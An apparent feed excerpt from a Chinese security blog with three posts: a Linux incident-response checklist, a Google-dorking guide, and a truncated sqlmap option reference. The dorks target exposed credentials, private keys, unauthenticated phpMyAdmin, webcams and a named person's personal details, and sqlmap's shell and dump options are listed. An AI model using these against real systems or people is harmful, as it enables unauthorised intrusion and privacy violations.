&lt;h2 id=&quot;0x00-基础&quot;&gt;&lt;a href=&quot;#0x00-基础&quot; class=&quot;headerlink&quot; title=&quot;0x00 基础&quot;&gt;&lt;/a&gt;0x00 基础&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;DNS:&lt;/strong&gt; 网域名称系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="DNS" scheme="http://sunu11.com/tags/DNS/"/>
    
      <category term="nslookup" scheme="http://sunu11.com/tags/nslookup/"/>
    
  </entry>
  
  <entry>
    <title>Linux 应急响应总结</title>
    <link href="http://sunu11.com/2017/03/01/7/"/>
    <id>http://sunu11.com/2017/03/01/7/</id>
    <published>2017-03-01T01:32:51.000Z</published>
    <updated>2017-03-27T01:27:02.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ofum8yjv2.bkt.clouddn.com/one.jpg" alt="icon"></p><h2 id="前言（扯犊子）："><a href="#前言（扯犊子）：" class="headerlink" title="前言（扯犊子）："></a>前言（扯犊子）：</h2><p>做为一名在前线的信息安全从业人员，应急响应技术是必不可缺的，在常见的安全保障模型P2DR模型中，response（响应）占据了其中重要的一个环节。<a id="more"></a>下面是本人学习到的应急响应的一些知识，技巧。<br><strong>一般应急响应流程：</strong><br><img src="http://ofum8yjv2.bkt.clouddn.com/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94.png" alt="yjxy icon"><br>整个流程中，尤为重要的莫过于获取安全事件发生后的处理阶段，下面重点总结了一下检查系统是否被入侵以及是否存在后门需要做的一些事情。</p><h2 id="检测点（重头戏）："><a href="#检测点（重头戏）：" class="headerlink" title="检测点（重头戏）："></a>检测点（重头戏）：</h2><h3 id="1】日志分析："><a href="#1】日志分析：" class="headerlink" title="1】日志分析："></a>1】日志分析：</h3><p><strong>下面为linux系统中一些重要的日志位置和简单注释。</strong><br>/var/log/messages — 包括整体系统信息，其中也包含系统启动期间的日志。此外，mail，cron，daemon，kern和auth等内容也记录在var/log/messages日志中。<br>/var/log/dmesg — 包含内核缓冲信息（kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用dmesg查看它们。<br>/var/log/auth.log — 包含系统授权信息，包括用户登录和使用的权限机制等。<br>/var/log/boot.log — 包含系统启动时的日志。<br>/var/log/daemon.log — 包含各种系统后台守护进程日志信息。<br>/var/log/dpkg.log – 包括安装或dpkg命令清除软件包的日志。<br>/var/log/kern.log – 包含内核产生的日志，有助于在定制内核时解决问题。<br>/var/log/lastlog — 记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容（*关于lastlog命令见注1）。<br>/var/log/maillog /var/log/mail.log — 包含来着系统运行电子邮件服务器的日志信息。例如，sendmail日志信息就全部送到这个文件中。<br>/var/log/user.log — 记录所有等级用户信息的日志。<br>/var/log/Xorg.x.log — 来自X的日志信息。<br>/var/log/alternatives.log – 更新替代信息都记录在这个文件中。<br>/var/log/btmp – 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，”last -f /var/log/btmp | more“。<br>/var/log/cups — 涉及所有打印信息的日志。<br>/var/log/anaconda.log — 在安装Linux时，所有安装信息都储存在这个文件中。<br>/var/log/yum.log — 包含使用yum安装的软件包信息。<br>/var/log/cron — 每当cron进程开始一个工作时，就会将相关信息记录在这个文件中。<br>/var/log/secure — 包含验证和授权方面信息。例如，sshd会将所有信息记录（其中包括失败登录）在这里。<br>/var/log/wtmp或/var/log/utmp — 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。<br>/var/log/faillog – 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。<br>除了上述Log文件以外， /var/log还基于系统的具体应用包含以下一些子目录。<br>/var/log/httpd/或/var/log/apache2 — 包含服务器access_log和error_log信息。<br>/var/log/lighttpd/ — 包含light HTTPD的access_log和error_log。<br>/var/log/mail/ –  这个子目录包含邮件服务器的额外日志。<br>/var/log/prelink/ — 包含.so文件被prelink修改的信息。<br>/var/log/audit/ — 包含被 Linux audit daemon储存的信息。<br>/var/log/samba/ – 包含由samba存储的信息。<br>/var/log/sa/ — 包含每日由sysstat软件包收集的sar文件。<br>/var/log/sssd/ – 用于守护进程安全服务。<br>~/.bash_history - 至关重要的日志，往往黑客会使用history -c清理相关的日志<br>/var/log/sudo.log - 查看SUDO日志在相应的时间段是否出现可疑的用户进行过SU操作<br>另外如果该台主机是做为一台web服务器，还可以审计一下其web服务器的日志，接触比较多的为apache、tomcat、nagix为主。无论哪种web服务器，access_log 和 error_log日志都是值得一看的 。一般find命令可以搞定。</p><h3 id="2】用户及用户文件分析"><a href="#2】用户及用户文件分析" class="headerlink" title="2】用户及用户文件分析"></a>2】用户及用户文件分析</h3><p>1、使用<code>ls -l /etc/passwd</code>查看passwd文件的权限—/etc/passwd默认权限为644即（rw-r–r–)，其最小权限为444(r–r–r–)，首先应对该文件权限进行检查，以确认配置是否正确；然后使用ls -l /etc/shadow 检查shadow文件的权限配置，默认权限为600(rw——-)，最小权限为400(r——–)。<br>2、使用<code>cat /etc/passwd</code>  查看passwd文件内容，判断是否存在可以账号。<br>3、使用<code>awk -F : &#39;$3==0{print}&#39; /etc/passwd</code>  查看是否存在UID为0的用户，该命令表示打印UID=的用户信息。</p><h3 id="3】系统文件的完整性分析"><a href="#3】系统文件的完整性分析" class="headerlink" title="3】系统文件的完整性分析"></a>3】系统文件的完整性分析</h3><h4 id="1、查看重要命令的MD5值是否发生改变"><a href="#1、查看重要命令的MD5值是否发生改变" class="headerlink" title="1、查看重要命令的MD5值是否发生改变"></a>1、查看重要命令的MD5值是否发生改变</h4><p>参数：<code>ls、find、du 、ps、top 、who、last、chsh、passwd、cat、 vi、crontab、netstat</code>等等<br>1)、找到上述命令所使用的文件：which ls find ps last 等等<br>2)、计算MD5的值：md5sum /bin/ls /usr/bin/find /usr/bin/ps  等等<br>3)、与相同版本系统或之前的备份的相应值进行比较。</p><h4 id="2、检查包安装后的变化"><a href="#2、检查包安装后的变化" class="headerlink" title="2、检查包安装后的变化"></a>2、检查包安装后的变化</h4><p>使用RPM命令进行查看，主要查看命令由哪一个包安装，并检查包自安装后文件是否发生过变化。</p><h4 id="3、检查系统是否存在ROOTKIT"><a href="#3、检查系统是否存在ROOTKIT" class="headerlink" title="3、检查系统是否存在ROOTKIT"></a>3、检查系统是否存在ROOTKIT</h4><p>一般检测工具可以使用chkrootkit、rkhunter等（详情请参考<a href="http://www.evil0x.com/posts/8146.html" target="_blank" rel="external">http://www.evil0x.com/posts/8146.html</a>）</p><h3 id="4】网络连接"><a href="#4】网络连接" class="headerlink" title="4】网络连接"></a>4】网络连接</h3><h4 id="1、端口："><a href="#1、端口：" class="headerlink" title="1、端口："></a>1、端口：</h4><p>使用netstat命令查看当前开放的端口信息，当然可灵活配合grep命令，获取需要的信息。更多netstat使用姿势可参考<a href="http://www.cnblogs.com/ggjucheng/archive/2012/01/08/2316661.html" target="_blank" rel="external">http://www.cnblogs.com/ggjucheng/archive/2012/01/08/2316661.html</a>。<br><img src="http://ofum8yjv2.bkt.clouddn.com/2.png" alt="icon"><br><img src="http://ofum8yjv2.bkt.clouddn.com/3.png" alt="icon"><br>可以使用lsof -i :port 显示进程和端口的对应关系<br><img src="http://ofum8yjv2.bkt.clouddn.com/4.png" alt="icon"></p><h4 id="2、当前登录用户"><a href="#2、当前登录用户" class="headerlink" title="2、当前登录用户"></a>2、当前登录用户</h4><p>执行w命令可以确定当前哪些用户已登录系统。<br><img src="http://ofum8yjv2.bkt.clouddn.com/6.png" alt="icon"></p><h3 id="5】进程和服务"><a href="#5】进程和服务" class="headerlink" title="5】进程和服务"></a>5】进程和服务</h3><p>1、使用<code>ps -aux</code>查看进程信息。或者使用<code>ps -ef</code> （ps -ef对于反弹shell，更便于发现）<br><img src="http://ofum8yjv2.bkt.clouddn.com/5.png" alt="icon"><br><img src="http://ofum8yjv2.bkt.clouddn.com/5.2.png" alt="icon"><br>2、使用chkconfig -list查看服务启动信息。</p><h3 id="6】其他方面："><a href="#6】其他方面：" class="headerlink" title="6】其他方面："></a>6】其他方面：</h3><p><strong>1</strong>、定位含有S位权限的文件<br>命令：<code>find / -perm -004000 -type f</code><br><img src="http://ofum8yjv2.bkt.clouddn.com/7.png" alt="icon"><br><strong>2</strong>、检查最近一段时间内更改的文件<br>find /home/work -type f -mtime T<br><strong>3</strong>、查看计划任务<br><code>crontab -l</code><br><code>cd /etc/crontab</code><br><code>ls</code><br><code>crontab -r</code>删除后门自启计划任务<br><strong>4</strong>、查看执行过什么命令<br><code>cat ~/.bash_history</code><br><code>history | grep &#39;2017-2-12&#39;</code>  根据时间查看干了什么<br><code>history | tail -n 5</code> 显示最近5次执行的命令<br><code>history -c</code> 清空history历史<br><strong>5</strong>、查看有没有提权痕迹<br><code>cat /etc/passwd</code>  极有可能其他用户出现id，组id 0、0的情况<br><code>lsof -g</code> gid号   通常能找到恶意文件关联的lib文件<br><strong>6</strong>、显示最后登录系统的倒数10条记录<br><code>last -10</code><br><strong>7</strong>、离线系统数据：<br>对于现场无法定位的系统，在取得批准后可将问题主机的数据进行镜像拷贝，方便随后进行分析。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上是应急响应的一些主要的步骤和流程，希望通过这些总结，给大家带来帮助。如有问题，欢迎留言交流~~</p><p><strong>Tips:</strong><br><em>1、在应急响应中，重要数据的分析工作最好拷贝至工作机器中新建的虚拟机中进行。</em><br><em>2、日志信息可以通过重定向来记录结果；在收集前使用du -sh /日志路径 命令判断日志文件大小，过大则根据情况提取特定时间段的日志信息。</em><br><em>3、根据情况还可以对流量、数据库、基础网络等方面进行检测排查。</em></p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>注1：<br>lastlog文件在每次有用户登录时被查询。可以以root身份运行lastlog命令检查某特定用户上次登录的时间，并格式化输出上次登录日志/var/log/lastlog的内容。它根据UID排序显示登录名、端口号（tty）和上次登录时间。如果一个用户从未登录过，lastlog显示<strong>Never logged</strong>。<br>*语法<br><code>lastlog(选项)</code></p><p>*选项<br><code>-b&lt;天数&gt;：显示指定天数前的登录信息&#39;</code><br><code>-h：显示召集令的帮助信息;</code><br><code>-t&lt;天数&gt;：显示指定天数以来的登录信息;</code><br><code>-u&lt;用户名&gt;：显示指定用户的最近登录信息。</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ofum8yjv2.bkt.clouddn.com/one.jpg&quot; alt=&quot;icon&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言（扯犊子）：&quot;&gt;&lt;a href=&quot;#前言（扯犊子）：&quot; class=&quot;headerlink&quot; title=&quot;前言（扯犊子）：&quot;&gt;&lt;/a&gt;前言（扯犊子）：&lt;/h2&gt;&lt;p&gt;做为一名在前线的信息安全从业人员，应急响应技术是必不可缺的，在常见的安全保障模型P2DR模型中，response（响应）占据了其中重要的一个环节。
    
    </summary>
    
      <category term="安全服务" scheme="http://sunu11.com/categories/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/"/>
    
    
      <category term="Linux" scheme="http://sunu11.com/tags/Linux/"/>
    
      <category term="应急响应" scheme="http://sunu11.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>搜索技巧总结</title>
    <link href="http://sunu11.com/2017/02/22/6/"/>
    <id>http://sunu11.com/2017/02/22/6/</id>
    <published>2017-02-22T13:31:36.000Z</published>
    <updated>2017-08-27T04:17:43.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://www.google.cn/landing/cnexp/google-search.png" alt="icon"></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>记得以前形容人的能力一般是用智商、情商来形容，但是到了现在这个信息澎湃的时代，搜商也愈来愈发重要，在渗透测试或者其他日常生活中，掌握好搜索技巧经常能事半功倍。<a id="more"></a>下面简单总结一下本人所熟悉的搜索语法：</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><strong>intext:</strong> 只搜索网页部分中包含的文字(也就是忽略了标题,URL 等的文字).(管理，)<br><strong>site:</strong> 可以限制你搜索范围的域名.   ex:site: baidu.com filetype:txt 查找 TXT 文件<br><strong>filetype:</strong> 搜索文件的后缀或者扩展名  （doc.mdb.ppt.swf.sql…）<br><strong>allintitle:</strong> 搜索所有关键字构成标题的网页. 但是推荐不要使用<br><strong>link:</strong> 可以得到一个所有包含了某个指定 URL 的页面列表. 例如:link:www.google.com  就可以得到所有连接到 Google 的页面<br><strong>Intitle</strong> or <strong>Allintitle:</strong> 在页面标题中搜索<br><strong>Related:</strong> 显示相关站点<br><strong>inanchor</strong> or <strong>allinanchor:</strong> 搜索范围限制在页面的链接锚点描述文本进行搜索<br><strong>Inurl</strong> or <strong>Allinurl:</strong> 在URL中查找文本（包含大量特殊字符，最为广泛使用）用于搜索网页上包含的 URL. (file,)<br><strong>Phonebook:</strong> 搜索电话列表<br><strong>Rphonebook:</strong> 搜索住宅电话列表<br><strong>Bphonebook:</strong> 商业电话列表<br><strong>Author:</strong> 搜索Google中新闻组帖子的作者<br><strong>Group:</strong> 搜索Google标题<br><strong>Inanchor:</strong> 在链接文本中查找文本<br><strong>Masgid:</strong> 通过消息id来查找谷歌的帖子<br><strong>Daterange:</strong> 查找某个特定日期范围内发布的网页<br><strong>Insubject:</strong> 搜索Googlegroup的主题行<br><strong>Cache:</strong> 显示网页的缓存版本<br><strong>Stocks:</strong> 搜索股票信息<br><strong>Info:</strong> 显示Google的摘要信息<br><strong>Define:</strong> 显示某术语的定义<br><strong>Numrang:</strong> 搜索数字需要两个参数一个最小数，一个最大数，用破折号隔开<br><strong>+</strong>      加入被忽略的词<br><strong>-</strong>      忽略排除某个词<br><strong>~</strong>      同意词即类似的词<br><strong>.</strong>      单一的通配符<br><strong>*</strong>      通配符，可代表多个字母<br><strong>“ ”</strong>    精确查询匹配<br><strong>布尔操作:</strong><br>and  与<br>or    或<br>not  不</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><blockquote><p>“Welcome to phpmyadmin <em>**” “running on </em> as root@*” intitle:phpmyadmin<br>“mysql error with query”  </p></blockquote><p><strong>数据库程序和错误文件</strong></p><blockquote><p>“Assessment report” “nessus” filetype:pdf  </p></blockquote><p><strong>安全扫描报告</strong></p><blockquote><p>“advanced guestbook * powered” inurl:addentry.php<br>intitle:”View img” inurl:viewimg.php </p></blockquote><p><strong>程序中含有SQL注入漏洞并且路径可以修改弱口</strong></p><blockquote><p>“php version” intitle:phpinfo inurl:info.php  </p></blockquote><p><strong>敏感信息</strong></p><blockquote><p>intitle:”usage Statistics(统计表) for” intext:”Total Unique Usernames”  </p></blockquote><p><strong>用户姓名</strong></p><blockquote><p>intitle:CV OR intitle:Lebenslauf “thomas fischer”<br>intitle:CV OR intitle:Lebenslauf ext:pdf OR ext:doc  </p></blockquote><p><strong>个人简历</strong></p><blockquote><p>allintext: name email phone address intext:”thomas fischer(人物)” ext:pdf<br>Twiki inurl:”View/Main” “thomas fischer”  </p></blockquote><p><strong>描述标识私人的信息(姓名，地址，电话，电话分机)</strong></p><blockquote><p>intitle:”live View/ -AXIS” | inurl:view/view.shtml<br>inurl:”ViewFrame?Mode=”<br>inurl:”MultiCameraFrame?Mode=”<br>inturl:”axis-cgi/mjpg”<br>intext:”MOBOTIX M1″<br>intext:”Open Menu”<br>inurl:”view/index.shtml”  </p></blockquote><p><strong>在线网络摄像头</strong></p><blockquote><p>“index of” (private | secure | geheim | gizli)<br>“robots.txt” “User-agent” ext:txt<br>“this document is private | confidential| secret” ext:doc | ext:pdf | ext:xls<br>intitle:”index of” “jpg | png | bmp” inurl”personal | inurl:private </p></blockquote><p><strong>机密的目录和文件</strong></p><blockquote><p>“index of” inbox.dbx<br>“To parent directory” inurl:”Identities” </p></blockquote><p><strong>私人信件/邮件</strong></p><blockquote><p>“session start” “session ident” thomas ext:txt </p></blockquote><p><strong>聊天日志</strong></p><blockquote><p>-“public | pubring | pubkeysignature | pgp | and | or |release” ext:gpg<br>-intext:”and” (ext:enc | ext:axx)<br>“ciphervalue” ext:xml</p></blockquote><p><strong>经过加密的消息</strong></p><blockquote><p>“Begin (DSA | RSA)” ext:key、“index of” “secring.gpg”  </p></blockquote><p><strong>搜索隐私的密码</strong></p><blockquote><p>“index of” slave_datatrans OR from_master </p></blockquote><p><strong>搜索密钥</strong></p><blockquote><p>“create table” insert into” “pass|passwd|password” (ext:sql | ext:dump | ext:txt)、“your password * is” (ext:csv | ext.doc | ext:txt)  </p></blockquote><p><strong>搜索用户名和密码</strong></p><blockquote><p>inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin  </p></blockquote><p><strong>查找可以未经授权就可以访问的phpMyAdmin的后台页面</strong></p><blockquote><p>“OpenSSL” AND “1.0.1 Server at” OR “1.0.1a Server at” OR “1.0.1b Server at” OR “1.0.1c Server at” OR “1.0.1d Server at” OR “1.0.1e Server at” OR “1.0.1f Server at”  </p></blockquote><h2 id="其他扩展"><a href="#其他扩展" class="headerlink" title="其他扩展"></a>其他扩展</h2><p>在使用搜索语法的同时也可以收集一些此类网址，对于找东西的帮助可是很大的呢<br><strong>搜索百度盘:</strong> <a href="http://sobaidupan.com" target="_blank" rel="external">http://sobaidupan.com</a><br><strong>盘搜:</strong> <a href="http://www.pansou.com" target="_blank" rel="external">http://www.pansou.com</a><br><strong>去转盘网:</strong> <a href="http://quzhuanpan.com" target="_blank" rel="external">http://quzhuanpan.com</a><br><strong>胖次搜索:</strong> <a href="http://www.panc.cc" target="_blank" rel="external">http://www.panc.cc</a><br><strong>西林街:</strong> <a href="http://www.xlinjie.com" target="_blank" rel="external">http://www.xlinjie.com</a><br><strong>天天云搜:</strong> <a href="http://so.ygyhg.com" target="_blank" rel="external">http://so.ygyhg.com</a><br><strong>呆木瓜:</strong> <a href="http://md5.daimugua.com" target="_blank" rel="external">http://md5.daimugua.com</a><br><strong>网盘007:</strong> <a href="http://wangpan007.com" target="_blank" rel="external">http://wangpan007.com</a><br><strong>钟馗之眼:</strong> <a href="https://www.zoomeye.org" target="_blank" rel="external">https://www.zoomeye.org</a><br><strong>shoudan:</strong> <a href="https://www.shodan.io" target="_blank" rel="external">https://www.shodan.io</a><br><strong>SeeBug:</strong> <a href="https://www.seebug.org" target="_blank" rel="external">https://www.seebug.org</a><br>等等,,,,,,</p><h2 id="留意"><a href="#留意" class="headerlink" title="留意"></a>留意</h2><p>(1) 操作符、冒号、关键字之间是没有空格的。<br>(2) 布尔操作符（AND、OR、NOT）和特殊字符（-、+）仍可用作高级操作符查询，但是不能把他们放在冒号之前而把冒号和操作符分开。<br>(3) 高级操作符能够和单独的查询混合使用<br>(4) ALL操作符（以ALL开头的操作符）非常古怪。一般情况下，一个查询中只能使用一次ALL操作符，而且不能和其他操作符混用。<br>(5) 其他更多搜索技巧可参考：<a href="https://www.exploit-db.com/google-hacking-database/?action=search&amp;ghdb_search_cat_id=0&amp;ghdb_search_text=" target="_blank" rel="external">https://www.exploit-db.com/google-hacking-database/?action=search&amp;ghdb_search_cat_id=0&amp;ghdb_search_text=</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://baike.so.com/doc/6950859-7173260.html" target="_blank" rel="external">http://baike.so.com/doc/6950859-7173260.html</a><br><a href="http://blog.jobbole.com/72211/" target="_blank" rel="external">http://blog.jobbole.com/72211/</a><br><a href="http://www.nxadmin.com/web/120.html" target="_blank" rel="external">http://www.nxadmin.com/web/120.html</a></p><h4 id="随时更新，有误之处，欢迎指出，欢迎交流。"><a href="#随时更新，有误之处，欢迎指出，欢迎交流。" class="headerlink" title="随时更新，有误之处，欢迎指出，欢迎交流。"></a>随时更新，有误之处，欢迎指出，欢迎交流。</h4>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://www.google.cn/landing/cnexp/google-search.png&quot; alt=&quot;icon&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;记得以前形容人的能力一般是用智商、情商来形容，但是到了现在这个信息澎湃的时代，搜商也愈来愈发重要，在渗透测试或者其他日常生活中，掌握好搜索技巧经常能事半功倍。
    
    </summary>
    
      <category term="神器" scheme="http://sunu11.com/categories/%E7%A5%9E%E5%99%A8/"/>
    
    
      <category term="Search" scheme="http://sunu11.com/tags/Search/"/>
    
      <category term="Google hack" scheme="http://sunu11.com/tags/Google-hack/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap总结（1）</title>
    <link href="http://sunu11.com/2016/11/05/4/"/>
    <id>http://sunu11.com/2016/11/05/4/</id>
    <published>2016-11-05T13:24:01.000Z</published>
    <updated>2016-11-28T15:32:35.000Z</updated>
    
    <content type="html"><![CDATA[   <p><b>基础</b></p><p>SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具。主要可以用来判断可注入的参数、注入的方式，识别数据库种类，读取数据，命令执行等作用。</p><p><font color="#880000">注入模式</font>：基于布尔的盲注、基于时间的盲注、基于报错注入、联合查询注入、堆查询注入</p><p><font color="#880000">支持的数据库</font>：MySQL, Oracle, PostgreSQL, Microsoft SQL Server, <a id="more"></a>Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p><p><font color="#880000">测试级别（7级）</font>：</p><p>0、只显示python错误以及严重的信息。</p><p>1、同时显示基本信息和警告信息。默认为1级</p><p>2、同时显示debug信息。</p><p>3、同时显示注入的payload。（推荐）</p><p>4、同时显示HTTP请求。</p><p>5、同时显示HTTP响应头。</p><p>6、同时显示HTTP响应页面。</p><p>&nbsp;</p><p><b>详细参数</b>：</p><p>-is-dba 当前用户权限（是否为root权限）</p><p>-dbs 所有数据库</p><p>-current-db 网站当前数据库</p><p>-users 所有数据库用户</p><p>-current-user 当前数据库用户</p><p>-random-agent 构造随机user-agent</p><p>-passwords 数据库密码</p><p>-proxy <a href="http://local:8080" target="_blank" rel="external">http://local:8080</a> –threads 10 (可以自定义线程加速) 代理</p><p>-time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p><p><font color="#880000">Target（目标）：设置目标URL。</font></p><p>-d DIRECT 直接连接到数据库。</p><p>-u URL, –url=URL 目标URL。</p><p>-l LIST 从Burp或WebScarab代理的日志中解析目标。</p><p>-r REQUESTFILE 从一个文件中载入HTTP请求。</p><p>-g GOOGLEDORK 处理Google dork的结果作为目标URL。</p><p>-c CONFIGFILE 从INI配置文件中加载选项。</p><p><font color="#880000">&nbsp;Request（请求）：用来指定如何连接到目标URL</font>。</p><p>-data=DATA 通过POST发送的数据字符串</p><p>-cookie=COOKIE HTTP Cookie头</p><p>-cookie-urlencode URL 编码生成的cookie注入</p><p>-drop-set-cookie 忽略响应的Set – Cookie头信息</p><p>-user-agent=AGENT 指定 HTTP User – Agent头</p><p>-random-agent 使用随机选定的HTTP User – Agent头</p><p>-referer=REFERER 指定 HTTP Referer头</p><p>-headers=HEADERS 换行分开，加入其他的HTTP头</p><p>-auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)</p><p>-auth-cred=ACRED HTTP身份验证凭据（用户名:密码）</p><p>-auth-cert=ACERT HTTP认证证书（key_file，cert_file）</p><p>-proxy=PROXY 使用HTTP代理连接到目标URL</p><p>-proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）</p><p>-ignore-proxy 忽略系统默认的HTTP代理</p><p>-delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒</p><p>-timeout=TIMEOUT 等待连接超时的时间（默认为30秒）</p><p>-retries=RETRIES 连接超时后重新连接的时间（默认3）</p><p>-scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式</p><p>-safe-url=SAFURL 在测试过程中经常访问的url地址</p><p>-safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL</p><p><font color="#880000">Enumeration（枚举）：用来列举后端数据库管理系统的信息、表中的结构和数据or 运行构造的sql语句</font></p><p>-b, –banner 检索数据库管理系统的标识</p><p>-current-user 检索数据库管理系统当前用户</p><p>-current-db 检索数据库管理系统当前数据库</p><p>-is-dba 检测DBMS当前用户是否DBA</p><p>-users 枚举数据库管理系统用户</p><p>-passwords 枚举数据库管理系统用户密码哈希</p><p>-privileges 枚举数据库管理系统用户的权限</p><p>-roles 枚举数据库管理系统用户的角色</p><p>-dbs 枚举数据库管理系统数据库</p><p>-D DBname 要进行枚举的指定数据库名</p><p>-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）</p><p>-tables 枚举的DBMS数据库中的表</p><p>-columns 枚举DBMS数据库表列</p><p>-dump 转储数据库管理系统的数据库中的表项</p><p>-dump-all 转储所有的DBMS数据库表中的条目</p><p>-search 搜索列（S），表（S）和/或数据库名称（S）</p><p>-C COL 要进行枚举的数据库列</p><p>-U USER 用来进行枚举的数据库用户</p><p>-exclude-sysdbs 枚举表时排除系统数据库</p><p>-start=LIMITSTART 第一个查询输出进入检索</p><p>-stop=LIMITSTOP 最后查询的输出进入检索</p><p>-first=FIRSTCHAR 第一个查询输出字的字符检索</p><p>-last=LASTCHAR 最后查询的输出字字符检索</p><p>-sql-query=QUERY 要执行的SQL语句</p><p>-sql-shell 提示交互式SQL的shell</p><p><font color="#880000">Optimization（优化）：用于优化SqlMap的性能</font></p><p>-o 开启所有优化开关</p><p>–predict-output 预测常见的查询输出</p><p>–keep-alive 使用持久的HTTP（S）连接</p><p>–null-connection 从没有实际的HTTP响应体中检索页面长度</p><p>–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）</p><p><font color="#880000">Injection（注入）：用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本</font></p><p>-p TESTPARAMETER 可测试的参数（S）</p><p>–dbms=DBMS 强制后端的DBMS为此值</p><p>–os=OS 强制后端的DBMS操作系统为这个值</p><p>–prefix=PREFIX 注入payload字符串前缀</p><p>–suffix=SUFFIX 注入payload字符串后缀</p><p>–tamper=TAMPER 使用给定的脚本（S）篡改注入数据</p><p><font color="#880000">Detection（检测）：用于指定在SQL盲注时如何解析和比较HTTP响应页面的内容</font></p><p>–level=LEVEL 执行测试的等级（1-5，默认为1）</p><p>–risk=RISK 执行测试的风险（0-3，默认为1）</p><p>–string=STRING 查询时有效时在页面匹配字符串</p><p>–regexp=REGEXP 查询时有效时在页面匹配正则表达式</p><p>–text-only 仅基于在文本内容比较网页</p><p><font color="#880000">Techniques（技巧）：用于调整具体的SQL注入测试</font></p><p>–technique=TECH SQL注入技术测试（默认BEUST）</p><p>–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）</p><p>–union-cols=UCOLS 定列范围用于测试UNION查询注入</p><p>–union-char=UCHAR 用于暴力猜解列数的字符</p><p><font color="#880000">Fingerprint（指纹）：</font></p><p>-f, –fingerprint 执行检查广泛的DBMS版本指纹</p><p><font color="#880000">Brute force（蛮力）：被用来运行蛮力检查</font></p><p>–common-tables 检查存在共同表</p><p>–common-columns 检查存在共同列</p><p><font color="#880000">User-defined function injection（用户自定义函数注入）：用来创建用户自定义函数。</font></p><p>–udf-inject 注入用户自定义函数</p><p>–shared-lib=SHLIB 共享库的本地路径</p><p><font color="#880000">File system access（访问文件系统）：用来访问后端数据库管理系统的底层文件系统。</font></p><p>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件</p><p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件</p><p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p><p><font color="#880000">Operating system access（操作系统访问）：用于访问后端数据库管理系统的底层操作系统。</font></p><p>–os-cmd=OSCMD 执行操作系统命令</p><p>–os-shell 交互式的操作系统的shell</p><p>–os-pwn 获取一个OOB shell，meterpreter或VNC</p><p>–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC</p><p>–os-bof 存储过程缓冲区溢出利用</p><p>–priv-esc 数据库进程用户权限提升</p><p>–msf-path=MSFPATH Metasploit Framework本地的安装路径</p><p>–tmp-path=TMPPATH 远程临时文件目录的绝对路径</p><p><font color="#880000">Windows注册表访问：用来访问后端数据库管理系统Windows注册表。</font></p><p>–reg-read 读一个Windows注册表项值</p><p>–reg-add 写一个Windows注册表项值数据</p><p>–reg-del 删除Windows注册表键值</p><p>–reg-key=REGKEY Windows注册表键</p><p>–reg-value=REGVAL Windows注册表项值</p><p>–reg-data=REGDATA Windows注册表键值数据</p><p>–reg-type=REGTYPE Windows注册表项值类型</p><p><font color="#880000">这些选项可以用来设置一些一般的工作参数。</font></p><p>-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中</p><p>-s SESSIONFILE 保存和恢复检索会话文件的所有数据</p><p>–flush-session 刷新当前目标的会话文件</p><p>–fresh-queries 忽略在会话文件中存储的查询结果</p><p>–eta 显示每个输出的预计到达时间</p><p>–update 更新SqlMap</p><p>–save file保存选项到INI配置文件</p><p>–batch 从不询问用户输入，使用所有默认配置。</p><p><font color="#880000">Miscellaneous（杂项）：</font></p><p>–beep 发现SQL注入时提醒</p><p>–check-payload IDS对注入payloads的检测测试</p><p>–cleanup SqlMap具体的UDF和表清理DBMS</p><p>–forms 对目标URL的解析和测试形式</p><p>–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果</p><p>–page-rank Google 